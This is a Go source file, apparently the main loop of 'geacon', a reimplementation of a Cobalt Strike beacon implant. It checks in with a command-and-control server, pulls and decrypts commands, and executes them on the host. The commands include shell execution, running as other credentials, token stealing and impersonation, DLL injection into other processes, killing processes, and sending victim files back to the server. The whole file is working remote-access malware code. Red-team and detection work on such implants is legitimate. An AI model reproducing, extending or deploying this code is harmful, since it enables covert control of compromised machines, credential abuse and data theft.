package main

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"main/command"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"main/util"
	"math/rand"
	"os"
	"strings"
	"time"
)

func main() {
	// set rand seed at beginning of the program
	rand.Seed(time.Now().UnixNano())
	ok := packet.FirstBlood()
	if ok {
		for {
			resp, err := packet.PullCommand()
			if err == nil {
				totalLen := len(resp)
				if totalLen > 0 {
					// end with 16 byte
					respByte := resp
					// hmacHash, useless
					_ = respByte[totalLen-util.HmacHashLen:]
					//fmt.Printf("hmac hash: %v\n", hmacHash)
					//TODO check the hmachash
					restBytes := respByte[:totalLen-util.HmacHashLen]
					decrypted := packet.DecryptPacket(restBytes)
					// first 4 bytes timestamp,useless
					_ = decrypted[:4]
					//fmt.Printf("timestamp: %v\n", timestamp)
					// 4 bytes data length
					lenBytes := decrypted[4:8]
					packetLen := packet.ReadInt(lenBytes)

					decryptedBuf := bytes.NewBuffer(decrypted[8:])
					for {
						if packetLen <= 0 {
							break
						}
						cmdType, cmdBuf := packet.ParsePacket(decryptedBuf, &packetLen)

						if cmdBuf != nil {
							fmt.Printf("Cmd type %d, Cmd buffer: %s\nCmd buffer bytes: %v\n", cmdType, cmdBuf, cmdBuf)
							var execErr error
							execErr = nil
							// replyType can be found at beacon.BeaconC2 process_beacon_callback_decrypted
							// it seems use CALLBACK_OUTPUT can solve chinese garbled, and utf8 can not
							switch cmdType {
							case command.CMD_TYPE_CHECKIN:
								_, execErr = packet.PullCommand()
							case command.CMD_TYPE_SHELL:
								var path, args []byte
								path, args, execErr = command.ParseCommandShell(cmdBuf)
								var result []byte
								result, execErr = command.Run(string(path), string(args))
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, result)
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_EXECUTE:
								execErr = command.Exec(cmdBuf)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte("exec success"))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_RUNAS:
								var domain, username, password, cmd, result []byte
								domain, username, password, cmd, execErr = command.ParseRunAs(cmdBuf)
								if execErr != nil {
									break
								}
								result, execErr = command.RunAs(domain, username, password, cmd)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, result)
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_GET_PRIVS:
								var privs []string
								var result string
								privs, execErr = command.ParseGetPrivs(cmdBuf)
								if execErr != nil {
									break
								}
								result, execErr = command.GetPrivs(privs)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(result))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_REV2SELF:
								execErr = command.Rev2self()
							case command.CMD_TYPE_STEAL_TOKEN:
								pid := packet.ReadInt(cmdBuf)
								execErr = command.StealToken(pid)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte("Steal token success"))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_MAKE_TOKEN:
								var domain, username, password []byte
								domain, username, password, execErr = command.ParseMakeToken(cmdBuf)
								if execErr != nil {
									break
								}
								execErr = command.MakeToken(domain, username, password)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte("Make token success"))
								packet.PushResult(finalPacket)
							// TODO have no idea about how to deal with token
							case command.CMD_TYPE_SPAWN_TOKEN_X64:
								fallthrough
							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X64:
								execErr = command.SpawnAndInjectDllX64(cmdBuf)
							case command.CMD_TYPE_SPAWN_TOKEN_X86:
								fallthrough
							case command.CMD_TYPE_SPAWN_IGNORE_TOKEN_X86:
								execErr = command.SpawnAndInjectDllX86(cmdBuf)
							case command.CMD_TYPE_INJECT_X86:
								fallthrough
							case command.CMD_TYPE_INJECT_X64:
								var pid uint32
								var dll []byte
								pid, dll, execErr = command.ParseInject(cmdBuf)
								execErr = command.InjectDll(pid, dll)
							case command.CMD_TYPE_JOB:
								execErr = command.HandlerJob(cmdBuf)
							case command.CMD_TYPE_GET_UID:
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(sysinfo.GetUsername()))
								packet.PushResult(finalPacket)
							// even there is a CALLBACK_PROCESS_LIST, but still use PENDING
							case command.CMD_TYPE_PS:
								finalPacket := packet.MakePacket(command.CALLBACK_PENDING, command.ListProcess(cmdBuf))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_KILL:
								pid := binary.BigEndian.Uint32(cmdBuf)
								execErr = command.KillProcess(int32(pid))
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(fmt.Sprintf("kill process %d success", pid)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_REMOVE:
								execErr = command.Remove(string(cmdBuf))
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(fmt.Sprintf("remove %s success", cmdBuf)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_FILE_COPY:
								var src []byte
								var dst []byte
								src, dst, execErr = command.ParseCommandCopy(cmdBuf)
								if execErr != nil {
									break
								}
								execErr = command.CopyFile(string(src), string(dst))
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(fmt.Sprintf("copy %s to %s", src, dst)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_FILE_MOVE:
								var src []byte
								var dst []byte
								src, dst, execErr = command.ParseCommandMove(cmdBuf)
								if execErr != nil {
									break
								}
								execErr = command.MoveFile(string(src), string(dst))
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(fmt.Sprintf("move %s to %s", src, dst)))
								packet.PushResult(finalPacket)
							// UPLOAD_START and UPLOAD_LOOP is same
							case command.CMD_TYPE_UPLOAD_START:
								fallthrough
							case command.CMD_TYPE_UPLOAD_LOOP:
								var filePath []byte
								var fileData []byte
								filePath, fileData, execErr = command.ParseCommandUpload(cmdBuf)
								if execErr != nil {
									break
								}
								filePathStr := strings.ReplaceAll(string(filePath), "\\", "/")
								_, execErr = command.Upload(filePathStr, fileData)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(fmt.Sprintf("upload %s success", filePath)))
								packet.PushResult(finalPacket)
							// download file from victim
							case command.CMD_TYPE_DOWNLOAD:
								filePath := cmdBuf
								strFilePath := string(filePath)
								strFilePath = strings.ReplaceAll(strFilePath, "\\", "/")
								execErr = command.Download(strFilePath)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_OUTPUT, []byte(fmt.Sprintf("download %s success", filePath)))
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_FILE_BROWSE:
								var dirResult []byte
								dirResult, execErr = command.FileBrowse(cmdBuf)
								if execErr != nil {
									break
								}
								finalPacket := packet.MakePacket(command.CALLBACK_PENDING, dirResult)
								packet.PushResult(finalPacket)
							case command.CMD_TYPE_CD:
								execErr = command.ChangeCurrentDir(cmdBuf)
							case command.CMD_TYPE_MAKEDIR:
								execErr = command.MakeDir(string(cmdBuf))
							case command.CMD_TYPE_SLEEP:
								sleep := packet.ReadInt(cmdBuf[:4])
								jitter := packet.ReadInt(cmdBuf[4:8])
								fmt.Printf("Now sleep is %d ms, jitter is %d%%\n", sleep, jitter)
								config.WaitTime = int(sleep)
								config.Jitter = int(jitter)
							case command.CMD_TYPE_PWD:
								var pwdResult []byte
								pwdResult, execErr = command.GetCurrentDirectory()
								if execErr != nil {
									break
								}
								finPacket := packet.MakePacket(command.CALLBACK_PWD, pwdResult)
								packet.PushResult(finPacket)
							case command.CMD_TYPE_LIST_NETWORK:
								var netResult []byte
								netResult, execErr = command.GetNetworkInformation(cmdBuf)
								if execErr != nil {
									break
								}
								finPacket := packet.MakePacket(command.CALLBACK_PENDING, netResult)
								packet.PushResult(finPacket)
							case command.CMD_TYPE_EXIT:
								finPacket := packet.MakePacket(command.CALLBACK_DEAD, []byte("exit"))
								packet.PushResult(finPacket)
								os.Exit(0)
							default:
								errMsg := fmt.Sprintf("command type %d is not support by geacon now\n", cmdType)
								command.ErrorMessage(errMsg)

							}
							if execErr != nil {
								command.ErrorMessage(execErr.Error())
							}
						}
					}
				}
			}
			command.Sleep()
		}
	}

}
